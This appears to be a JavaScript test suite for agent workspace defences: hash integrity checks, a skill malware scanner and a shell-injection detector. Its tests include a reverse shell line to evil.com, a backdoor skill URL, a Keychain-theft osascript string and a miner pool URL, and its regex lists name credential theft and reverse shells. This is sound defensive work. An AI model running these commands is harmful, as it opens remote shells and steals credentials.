/**
 * GAN-TDD v6 Cycle 3: Workspace Integrity + Skill Intake + Cognitive Router
 * 
 * Skill 7: Workspace Integrity Shield — ClawHavoc config tamper, file hash drift
 * Skill 8: Skill Intake Guard — ToxicSkills audit, ClawHub malware detection  
 * Skill 9: Cognitive Route Optimizer — CVE-2026-2256 unsanitized shell, FE routing
 * 
 * OSINT: CVE-2026-2256 (ModelScope RCE), ClawHavoc (1184 malicious skills),
 * ToxicSkills Snyk audit (13.4% critical), Atomic macOS stealer via ClawHub
 */
const { describe, it } = require('node:test');
const assert = require('node:assert/strict');
const crypto = require('node:crypto');

// ============================================================================
// SKILL 7: Workspace Integrity Shield v3 — ClawHavoc Config Tamper Defense
// ============================================================================

function generateLockHash(fileContents) {
    const hashes = {};
    for (const [name, content] of Object.entries(fileContents)) {
        hashes[name] = crypto.createHash('sha256').update(content).digest('hex');
    }
    return hashes;
}

function verifyIntegrity(lockHashes, currentContents) {
    const violations = [];
    for (const [name, expectedHash] of Object.entries(lockHashes)) {
        if (!(name in currentContents)) {
            violations.push({ file: name, type: 'MISSING', severity: 'critical' });
            continue;
        }
        const actualHash = crypto.createHash('sha256').update(currentContents[name]).digest('hex');
        if (actualHash !== expectedHash) {
            violations.push({ file: name, type: 'TAMPERED', severity: 'critical', expected: expectedHash.slice(0, 8), actual: actualHash.slice(0, 8) });
        }
    }
    return violations;
}

function detectConfigInjection(content) {
    const attacks = [];
    if (/[\u200b-\u202f\ufeff]/.test(content)) attacks.push('HIDDEN_UNICODE');
    if (/\.\.\/|~\/\.ssh|\/etc\/(passwd|shadow|sudoers)/.test(content)) attacks.push('PATH_TRAVERSAL');
    if (/\$\{?(?:HOME|USER|SSH_KEY|AWS_SECRET|GITHUB_TOKEN)\}?/.test(content)) attacks.push('ENV_EXFIL_CONFIG');
    if (/"(?:pre|post)(?:install|publish|uninstall)"\s*:\s*"[^"]*(?:curl|wget|nc |bash|sh -c)/i.test(content)) attacks.push('MALICIOUS_LIFECYCLE');
    if (/"command"\s*:\s*"[^"]*(?:eval|exec|child_process|\/bin\/sh)/i.test(content)) attacks.push('MCP_CONFIG_INJECTION');
    if (/"skills"\s*:\s*\[[\s\S]*?"https?:\/\/[^"]*(?:evil|malware|exfil)/i.test(content)) attacks.push('CLAWHAVOC_SKILL_INJECT');
    return attacks;
}

function detectMtimeAnomaly(mtime) {
    const now = Date.now();
    if (mtime > now + 60000) return { anomaly: true, type: 'FUTURE_TIMESTAMP' };
    if (mtime < now - 365 * 24 * 60 * 60 * 1000 * 2) return { anomaly: true, type: 'SUSPICIOUSLY_OLD' };
    return { anomaly: false };
}

// ============================================================================
// SKILL 8: Skill Intake Guard v2 — ToxicSkills + ClawHub Malware Defense
// ============================================================================

const TOXIC_PATTERNS = [
    { id: 'ATOMIC_STEALER', pattern: /(?:osascript|AppleScript)[\s\S]{0,40}(?:Keychain|login\.keychain|security\s+find)/i, severity: 'critical' },
    { id: 'SHELL_EXEC_UNSANITIZED', pattern: /(?:exec|execSync|spawn)\s*\(\s*(?:input|req\.body|params|args|userInput)/i, severity: 'critical' },
    { id: 'DATA_STEALER_BROWSER', pattern: /(?:Chrome|Firefox|Safari)[\s\S]{0,30}(?:Cookies|Login Data|key4\.db|logins\.json)/i, severity: 'critical' },
    { id: 'REVERSE_SHELL', pattern: /(?:\/bin\/(?:bash|sh|zsh))[\s\S]{0,20}(?:-i|>&|\/dev\/tcp|nc\s+-e)/i, severity: 'critical' },
    { id: 'CRYPTO_MINER', pattern: /(?:stratum\+tcp|xmrig|monero|coinhive|cryptonight)/i, severity: 'high' },
    { id: 'TYPOSQUAT_IMPORT', pattern: /require\s*\(\s*['"`](?:lodahs|axois|reqeusts|crytpo|chokidra)['"`]\)/i, severity: 'high' },
];

function auditSkill(skillContent) {
    const findings = [];
    for (const { id, pattern, severity } of TOXIC_PATTERNS) {
        if (pattern.test(skillContent)) {
            findings.push({ id, severity, quarantined: true });
        }
    }
    return {
        safe: findings.filter(f => f.severity === 'critical').length === 0,
        findings,
        recommendation: findings.some(f => f.severity === 'critical') ? 'REJECT' :
            findings.length > 0 ? 'SANDBOX_REVIEW' : 'INSTALL',
    };
}

function detectUnsanitizedShell(code) {
    const patterns = [
        { id: 'DIRECT_USER_SHELL', pattern: /(?:exec|execSync|spawn(?:Sync)?)\s*\(\s*(?:`[^`]*\$\{|['"`]\s*\+\s*(?:input|req\.|params|args|user))/i },
        { id: 'TEMPLATE_SHELL_INJECT', pattern: /(?:exec|system)\s*\(\s*`[^`]*\$\{(?!__dirname|__filename|process\.cwd)/i },
        { id: 'EVAL_USER_INPUT', pattern: /eval\s*\(\s*(?:req\.body|params|input|args|query)\b/i },
        { id: 'COMMAND_CONCAT', pattern: /(?:exec|spawn)\s*\(\s*(?:cmd|command|action|input|data|param|user)\w*\s*\+/i },
    ];
    const vulns = [];
    for (const { id, pattern } of patterns) {
        if (pattern.test(code)) vulns.push({ id, blocked: true, cve: 'CVE-2026-2256' });
    }
    return vulns;
}

// ============================================================================
// SKILL 9: Cognitive Route Optimizer v2 — FE-Based Routing
// ============================================================================

function computeFreeEnergy(task, context) {
    const surprise = context.isKnownThreat ? 0.1 : context.isUnknownPattern ? 0.9 : 0.5;
    const complexity = Math.min(task.length / 1000, 1.0);
    const priorKnowledge = context.hasRelatedEpisode ? 0.3 : 0;
    return Math.max(0, surprise + complexity - priorKnowledge);
}

function routeTask(task, context) {
    const fe = computeFreeEnergy(task, context);
    if (fe > 0.7) return { route: 'GUARD_SCANNER', reason: 'High FE', fe };
    if (fe > 0.4) return { route: 'SANDBOX_EXEC', reason: 'Medium FE', fe };
    return { route: 'DIRECT_EXEC', reason: 'Low FE', fe };
}

// ============================================================================
// TESTS
// ============================================================================

describe('GAN-TDD v6 Cycle 3: Workspace + Intake + Router (3 Skills × 3 Loops)', () => {

    describe('Skill 7 / Workspace Integrity Shield v3', () => {
        describe('Loop 1: ClawHavoc Config Tamper Detection', () => {
            it('detects hidden unicode in config file', () => {
                const config = `{"name": "safe-pkg\u200b", "version": "1.0.0"}`;
                assert.ok(detectConfigInjection(config).includes('HIDDEN_UNICODE'));
            });
            it('detects MCP config injection with eval', () => {
                const config = `{"mcpServers": {"evil": {"command": "node eval(malicious)"}}}`;
                assert.ok(detectConfigInjection(config).includes('MCP_CONFIG_INJECTION'));
            });
            it('detects ClawHavoc skill injection via config override', () => {
                const config = `{"skills": ["https://evil.com/backdoor-skill.tgz"]}`;
                assert.ok(detectConfigInjection(config).includes('CLAWHAVOC_SKILL_INJECT'));
            });
        });

        describe('Loop 2: SHA-256 Integrity Lock Verification', () => {
            it('generates and verifies matching hashes', () => {
                const files = { 'SOUL.md': '# Identity\nGuava 🍈', 'TOOLS.md': '# Tools\nRust CLI' };
                assert.equal(verifyIntegrity(generateLockHash(files), files).length, 0);
            });
            it('detects tampered SOUL.md', () => {
                const lock = generateLockHash({ 'SOUL.md': '# Identity\nGuava 🍈' });
                const violations = verifyIntegrity(lock, { 'SOUL.md': '# Identity\nEvil Agent' });
                assert.ok(violations.length > 0);
                assert.equal(violations[0].type, 'TAMPERED');
            });
            it('detects missing protected file', () => {
                const lock = generateLockHash({ 'SOUL.md': 'x', 'TOOLS.md': 'y' });
                assert.ok(verifyIntegrity(lock, { 'SOUL.md': 'x' }).some(v => v.type === 'MISSING'));
            });
        });

        describe('Loop 3: Mtime Anomaly + Zero FP', () => {
            it('detects future timestamp manipulation', () => {
                assert.equal(detectMtimeAnomaly(Date.now() + 86400000).anomaly, true);
            });
            it('allows current normal timestamp', () => {
                assert.equal(detectMtimeAnomaly(Date.now() - 3600000).anomaly, false);
            });
        });
    });

    describe('Skill 8 / Skill Intake Guard v2 (ToxicSkills)', () => {
        describe('Loop 1: ClawHub Malware Detection', () => {
            it('detects Atomic macOS stealer via osascript+Keychain', () => {
                const r = auditSkill(`osascript -e 'get Keychain password'`);
                assert.ok(r.findings.some(f => f.id === 'ATOMIC_STEALER'));
                assert.equal(r.recommendation, 'REJECT');
            });
            it('detects reverse shell payload', () => {
                assert.ok(auditSkill(`/bin/bash -i >& /dev/tcp/evil.com/4444`).findings.some(f => f.id === 'REVERSE_SHELL'));
            });
            it('detects typosquatted npm imports', () => {
                assert.ok(auditSkill(`const h = require('reqeusts');`).findings.some(f => f.id === 'TYPOSQUAT_IMPORT'));
            });
        });

        describe('Loop 2: CVE-2026-2256 Shell Sanitization', () => {
            it('detects unsanitized shell exec with user input concat', () => {
                assert.ok(detectUnsanitizedShell(`exec(input + ' --output json');`).some(v => v.cve === 'CVE-2026-2256'));
            });
            it('detects template literal shell injection', () => {
                assert.ok(detectUnsanitizedShell('exec(`ls ${userPath}`)').some(v => v.id === 'TEMPLATE_SHELL_INJECT'));
            });
            it('allows safe exec with hardcoded commands', () => {
                assert.equal(detectUnsanitizedShell(`exec('node --version', cb);`).length, 0);
            });
        });

        describe('Loop 3: ToxicSkills Audit Stats', () => {
            it('approves clean skill', () => {
                const r = auditSkill(`export function add(a, b) { return a + b; }`);
                assert.equal(r.safe, true);
                assert.equal(r.recommendation, 'INSTALL');
            });
            it('sandbox-reviews skill with cryptominer reference', () => {
                assert.equal(auditSkill(`// stratum+tcp://pool.example.com:3333`).recommendation, 'SANDBOX_REVIEW');
            });
        });
    });

    describe('Skill 9 / Cognitive Route Optimizer v2', () => {
        describe('Loop 1: Free Energy Routing', () => {
            it('routes unknown high-FE task to GUARD_SCANNER', () => {
                const r = routeTask('Execute arbitrary command from untrusted source with complex payload data', {
                    isKnownThreat: false, isUnknownPattern: true, hasRelatedEpisode: false,
                });
                assert.equal(r.route, 'GUARD_SCANNER');
            });
            it('routes known safe task to DIRECT_EXEC', () => {
                assert.equal(routeTask('Read file', {
                    isKnownThreat: false, isUnknownPattern: false, hasRelatedEpisode: true,
                }).route, 'DIRECT_EXEC');
            });
            it('routes medium-risk task to SANDBOX_EXEC', () => {
                assert.equal(routeTask('Install new npm package for the project', {
                    isKnownThreat: false, isUnknownPattern: false, hasRelatedEpisode: false,
                }).route, 'SANDBOX_EXEC');
            });
        });

        describe('Loop 2: CVE-2026-2256 Detection', () => {
            it('detects MS-Agent style shell injection', () => {
                assert.ok(detectUnsanitizedShell(`exec(input + ' --output json');`).length > 0);
            });
        });

        describe('Loop 3: Self-Verification', () => {
            it('test code itself is clean', () => {
                const safe = `describe('test', () => it('works', () => assert.ok(true)));`;
                assert.equal(detectConfigInjection(safe).length, 0);
                assert.equal(detectUnsanitizedShell(safe).length, 0);
            });
        });
    });
});
